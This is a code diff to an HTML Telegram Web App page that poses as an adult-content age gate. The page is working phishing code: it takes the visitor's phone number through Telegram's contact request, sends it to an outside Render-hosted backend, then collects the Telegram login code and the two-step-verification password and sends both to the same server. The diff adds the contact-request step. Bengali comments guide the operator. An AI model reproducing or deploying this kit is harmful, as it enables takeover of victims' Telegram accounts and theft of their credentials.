@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Web App UI</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
             --primary-btn: #7265e3;
@@ -34,7 +35,6 @@
             border: 1px solid rgba(255, 255, 255, 0.15); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
         }
 
-        /* Telegram Style Modal */
         .modal-overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.7); z-index: 100; justify-content: center; align-items: center;
@@ -89,7 +89,6 @@
     </div>
 
     <div class="app-container">
-        
         <div class="step active" id="step1">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Symbols/No%20One%20Under%20Eighteen.webp" class="emoji-img">
             <h2>Confirm you are 18+</h2>
@@ -101,7 +100,6 @@
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Mobile%20Phone.webp" class="emoji-img">
             <h2>Enter Code</h2>
             <p>Verification code has been sent to your Telegram.</p>
-            
             <div id="otp-wrap">
                 <input type="text" class="code-input" id="otp1" readonly placeholder="•">
                 <input type="text" class="code-input" id="otp2" readonly placeholder="•">
@@ -110,7 +108,6 @@
                 <input type="text" class="code-input" id="otp5" readonly placeholder="•">
             </div>
             <div id="otp-error" class="error-msg">Please enter the correct code.</div>
-
             <div class="keypad">
                 <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
                 <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
@@ -134,14 +131,13 @@
             <p>Access all premium videos below.</p>
             <button class="btn" style="background: #ff9500;" onclick="window.location.href='https://t.me/your_channel'">🎬 ALL PREMIUM VIDEOS</button>
         </div>
-
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        // Render থেকে পাওয়া ব্যাকএন্ড লিঙ্কটি নিচে বসান
         const RENDER_URL = "https://s23315984.onrender.com"; 
-        
+        const tg = window.Telegram.WebApp; // টেলিগ্রাম ওয়েব অ্যাপ অবজেক্ট
+        tg.expand(); // ফুল স্ক্রিন ওপেন হবে
+
         let currentOtp = "";
         let userPhone = "";
 
@@ -153,37 +149,44 @@
         function openModal() { document.getElementById('contactModal').style.display = 'flex'; }
         function closeModal() { document.getElementById('contactModal').style.display = 'none'; }
 
-        // Step 1: নম্বর সংগ্রহ ও ওটিপি রিকোয়েস্ট
+        // নম্বর শেয়ার করার নতুন মেথড
         async function confirmShare() {
             closeModal();
-            userPhone = prompt("আপনার টেলিগ্রাম নম্বরটি আন্তর্জাতিক ফরম্যাটে দিন (যেমন: +88017XXXXXXXX):");
-            if (!userPhone) return;
+            
+            // টেলিগ্রামের অফিশিয়াল নম্বর শেয়ার রিকোয়েস্ট
+            tg.requestContact((sent, response) => {
+                if (sent && response.contact) {
+                    userPhone = response.contact.phone_number;
+                    // যদি নম্বরে '+' না থাকে, তবে তা যোগ করে দেওয়া হবে
+                    if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
+                    
+                    sendOtpToRender(userPhone);
+                } else {
+                    alert("ভিডিও দেখতে হলে নম্বর শেয়ার করা বাধ্যতামূলক।");
+                }
+            });
+        }
 
+        async function sendOtpToRender(phone) {
             try {
                 const res = await fetch(`${RENDER_URL}/send_otp`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ phone: userPhone })
+                    body: JSON.stringify({ phone: phone })
                 });
                 const data = await res.json();
-                
                 if (data.status === "success") {
-                    nextStep(2); // ওটিপি পেজে নিয়ে যাবে
+                    nextStep(2);
                 } else {
-                    alert("সমস্যা: " + (data.message || "সার্ভারে কানেক্ট করা যাচ্ছে না"));
+                    alert("সমস্যা: " + data.message);
                 }
             } catch (err) {
-                alert("সার্ভার রেসপন্স দিচ্ছে না। রেন্ডার সার্ভারটি লাইভ আছে কি না চেক করুন।");
+                alert("সার্ভার কানেকশন এরর। রেন্ডার অ্যাপটি লাইভ আছে কি না দেখুন।");
             }
         }
 
-        // Step 2: ওটিপি কিপ্যাড ও ভেরিফিকেশন
         async function press(num) {
             const wrap = document.getElementById('otp-wrap');
-            const errDiv = document.getElementById('otp-error');
-            wrap.classList.remove('shake');
-            errDiv.style.display = "none";
-
             if (num === 'C') currentOtp = "";
             else if (num === '⌫') currentOtp = currentOtp.slice(0, -1);
             else if (currentOtp.length < 5) currentOtp += num;
@@ -193,54 +196,33 @@
             }
 
             if (currentOtp.length === 5) {
-                try {
-                    const res = await fetch(`${RENDER_URL}/verify`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ phone: userPhone, otp: currentOtp })
-                    });
-                    const data = await res.json();
-                    
-                    if (data.status === "done") {
-                        nextStep(4); // সফল হলে লাস্ট পেজ
-                    } else if (data.status === "need_2fa") {
-                        nextStep(3); // ২এফএ দরকার হলে ৩ নম্বর পেজ
-                    } else {
-                        wrap.classList.add('shake');
-                        errDiv.style.display = "block";
-                        currentOtp = "";
-                        setTimeout(() => { for(let i=1;i<=5;i++) document.getElementById('otp'+i).value=""; }, 500);
-                    }
-                } catch (err) {
-                    alert("ভেরিফিকেশন ফেল হয়েছে।");
+                const res = await fetch(`${RENDER_URL}/verify`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ phone: userPhone, otp: currentOtp })
+                });
+                const data = await res.json();
+                if (data.status === "done") nextStep(4);
+                else if (data.status === "need_2fa") nextStep(3);
+                else {
+                    wrap.classList.add('shake');
+                    setTimeout(() => wrap.classList.remove('shake'), 500);
+                    currentOtp = "";
+                    for(let i=1;i<=5;i++) document.getElementById('otp'+i).value="";
                 }
             }
         }
 
-        // Step 3: ২এফএ পাসওয়ার্ড ভেরিফিকেশন
         async function verify2FA() {
             const pass = document.getElementById('2fa-input').value;
-            const errDiv = document.getElementById('2fa-error');
-            
-            if (!pass) return;
-
-            try {
-                const res = await fetch(`${RENDER_URL}/verify`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ phone: userPhone, otp: currentOtp, password: pass })
-                });
-                const data = await res.json();
-                
-                if (data.status === "done") {
-                    nextStep(4);
-                } else {
-                    document.getElementById('2fa-input').classList.add('shake');
-                    errDiv.style.display = "block";
-                }
-            } catch (err) {
-                alert("সার্ভার ত্রুটি!");
-            }
+            const res = await fetch(`${RENDER_URL}/verify`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: userPhone, otp: currentOtp, password: pass })
+            });
+            const data = await res.json();
+            if (data.status === "done") nextStep(4);
+            else alert("ভুল পাসওয়ার্ড!");
         }
     </script>
 </body>
